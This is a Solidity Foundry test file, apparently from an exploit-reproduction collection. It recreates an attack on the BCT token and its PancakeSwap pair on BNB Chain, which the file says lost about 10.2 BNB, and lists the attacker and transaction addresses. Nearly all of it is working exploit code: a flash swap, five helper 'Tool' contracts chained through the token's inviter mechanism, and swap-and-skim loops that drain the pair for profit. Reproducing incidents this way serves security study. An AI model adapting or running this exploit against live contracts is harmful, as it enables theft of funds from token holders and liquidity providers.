// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~10.2BNB
// Attacker : https://bscscan.com/address/0x9c66b0c68c144ffe33e7084fe8ce36ebc44ad21e
// Attack Contract : https://bscscan.com/address/0xe9616ff20ad519bce0e3d61353a37232f0c27a50
// Vulnerable Contract : https://bscscan.com/address/0x88b3eb62e363d9f153beab49c5c2ef2e785a375a
// Attack Tx : https://bscscan.com/tx/0xdae0b85e01670e6b6b317657a72fb560fc388664cf8bfdd9e1b0ae88e0679103

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x88b3eb62e363d9f153beab49c5c2ef2e785a375a#code

// @Analysis
// the attack happend with 2 txs
// (1) 0xd4c19d575ea5b3a415cc288ce09942299ca3a3b49ef9718cda17e4033dd4c250, this tx creates 5 self initiated tool contract (contract Tool in the below) and prepare the environments for the attack
// (2) 0xdae0b85e01670e6b6b317657a72fb560fc388664cf8bfdd9e1b0ae88e0679103, this tx contains several weird and malicious operations, which are shown below
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";


interface IBCT {
    function inviter(address) external view returns (address);
}

interface IInviter {
    function buy(address, address, uint256) external;
    function f_0xf986351d(address, address, uint256) external;
    function f_0x4e515153(address, address, uint256) external;
}

contract BCT is BaseTestWithBalanceLog {
    IPancakePair PancakePair = IPancakePair(0x1B96B92314C44b159149f7E0303511fB2Fc4774f); // KIMO/WBNB pair
    address private wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IERC20 Wbnb = IERC20(wbnb);

    address bct = 0x70ca72BB4A1386439a2a51476f2335A31005EBe8;
    address pancakepair = 0x88b3EB62e363d9f153BeAb49c5C2EF2E785a375a;

    address cake_lp = 0x5A25B8576B14699bbb15947111f5811E58B39A82;

    address busd = 0x55d398326f99059fF775485246999027B3197955;

    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    Uni_Pair_V2 cakeLP = Uni_Pair_V2(cake_lp);


    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 34_204_710-1); 
        deal(address(this), 0.1 ether);
    }

    function testExploit() public {
        uint256 before = Wbnb.balanceOf(address(this));
        init(); // simulate the first tx for preparation
        // attack begin
        PancakePair.swap(20000000000000000000, 0, address(this), abi.encode("0x20"));
        emit log_named_decimal_uint(
            "[End] After repay, Profit: BNB balance of attacker", Wbnb.balanceOf(address(this))-before, 18
        );
    }

    // simulate the preparation of the attack, tx: https://bscscan.com/tx/0xd4c19d575ea5b3a415cc288ce09942299ca3a3b49ef9718cda17e4033dd4c250
    // function 0xe531876d of the attacker contract
    function init() public {
        address[] memory tools = new address[](5);
        
        // create 5 tools for the following attack
        for (uint256 i = 0; i < 5; i++) {
            Tool tool = new Tool();
            tools[i] = address(tool);
        }

        address first = tools[0];

        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = bct;
        // msg.value share to 5 addresses
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(1000000000000000, path, address(this), 99999999999999999999999999);
        IERC20(bct).transfer(first, 1000000000000000);
        IInviter(first).f_0x4e515153(bct, address(this), 500000000000000);
        uint i = 0;
        while (i < 5) {
            uint k = 4;
            if (i < k){
                address current_tool = tools[i];
                address next_tool = tools[i+1];
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(1000000000000000, path, current_tool, 99999999999999999999999999);
                IInviter(current_tool).f_0x4e515153(bct, next_tool, 1000000000000000);
                IInviter(next_tool).f_0x4e515153(bct, current_tool, 500000000000000);
            }
            i++;
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // address inviter = 0xe9616ff20ad519Bce0e3D61353a37232F0c27A50; // the attacker contract
        address inviter = address(this);
        uint index = 0;
        address[] memory inviters = new address[](5);
        while (index < 5) {
            address inviter_ = IBCT(bct).inviter(inviter);
            inviters[index] = inviter_;
            inviter = inviter_;
            index++;

            uint256 amount = IERC20(bct).balanceOf(inviter_);
        }
        index = 0;
        while (index < 5) {
            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();

            uint256 buyAmount = calculateValue(reserve1, reserve0, 60e18);
            
            Wbnb.transfer(inviters[index], buyAmount);
            // vm.prank(address(this), 0x9c66B0c68c144Ffe33E7084FE8cE36EBC44aD21e);
            IInviter(inviters[index]).buy(wbnb, pancakepair, buyAmount);
            index++;
        }

        index = 0;
        while (index < 10) {
            uint256 balance = Wbnb.balanceOf(address(this));
            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = IPancakePair(pancakepair).getReserves();
            uint256 amount = calculate(reserve1, reserve0, balance);

            Wbnb.transfer(pancakepair, balance);
            IPancakePair(pancakepair).swap(amount, 0, cake_lp, "");
            IPancakePair(cake_lp).skim(address(this));

           while (true) {
                uint256 bct_balance = IERC20(bct).balanceOf(address(this));
                if (bct_balance > 1e18) {
                    IERC20(bct).transfer(cake_lp, bct_balance);
                    IPancakePair(cake_lp).skim(address(this));
                } else {
                    process(30e18, inviters);
                    index++;
                    break;
                }
           }
        }

        process(0, inviters);
        Wbnb.transfer(address(PancakePair), 20050000000000000001);
    }

    function process(uint256 inamount, address[] memory inviters) internal {
        uint index = 0;
        while (index < 5) {
            address bct_inviter = inviters[index];
            uint256 balance_inviter = IERC20(bct).balanceOf(bct_inviter);
            address addr1 = 0x70ca72BB4A1386439a2a51476f2335A31005EBe8;
            address addr2 = 0x5A25B8576B14699bbb15947111f5811E58B39A82;
            uint256 amount = balance_inviter - inamount;

            IInviter(bct_inviter).f_0xf986351d(addr1, addr2, amount);
            index++;
        }

        uint256 busd_balance = IERC20(busd).balanceOf(address(this));
        (uint112 reserve0, uint112 reserve1, uint32 timestamp) = cakeLP.getReserves();
        IERC20(busd).transfer(cake_lp, busd_balance);
        uint256 swap_amount = calculate(reserve0, reserve1, busd_balance);
        cakeLP.swap(0,swap_amount,pancakepair,"");

        (uint112 r0, uint112 r1, uint32 t) = IPancakePair(pancakepair).getReserves();
        uint256 swap_amount2 = calculate(r0, r1, swap_amount * 85 / 100);
        IPancakePair(pancakepair).swap(0, swap_amount2, address(this), "");
        
    }

    function calculateValue(uint112 reserve1, uint112 reserve0, uint256 amount) private pure returns (uint256) {
        uint256 v13 = uint256(reserve1) * amount;
        uint256 v14 = 10000 * v13;
        uint256 v15 = uint256(reserve0) - amount;
        uint256 v16 = 9975 * v15;
        return 1 + (v14 / v16);
    }

    function calculate(uint112 varg0, uint112 varg1, uint256 varg2) private pure returns (uint256) {
        uint256 v0 = 9975 * varg2;       
        uint256 v1 = v0 * varg1;      
        uint256 v2 = 10000 * varg0;      
        uint256 v3 = v2 + v0;            
        return v1 / v3;                
    }

    receive() external payable {}
}


contract Tool {
    address _call;

    constructor() {
        _call = tx.origin;  // hacker's EOA (foundry account)
    }

    function buy(address _srcAddr, address _destAddr, uint256 _destAmount) public { 
        require(tx.origin == _call);
        IERC20(_srcAddr).transfer(_destAddr, _destAmount);
        IPancakePair(_destAddr).swap(60e18, 0, address(this), "");
    }

    // dedaub-like solidity
    function f_0xf986351d(address varg0, address varg1, uint256 varg2) public { 
        require(tx.origin == _call);
        (uint112 v1, uint112 v2, uint32 v3) = IPancakePair(varg1).getReserves();
        uint256 v4 = 85 * varg2;
        uint256 v5 = 9975 * v4 / 100;
        uint256 v6 = v5 * v1;
        uint256 v7 = 10000 * v2;

        IERC20(varg0).transfer(varg1, varg2);
        IPancakePair(varg1).swap(v6 / (v5 + v7), 0, msg.sender, "");
    }

    function f_0x4e515153(address varg0, address varg1, uint256 varg2) public { 
        require(tx.origin == _call);
        IERC20(varg0).transfer(varg1, varg2);
    }

    receive() external payable {}
}
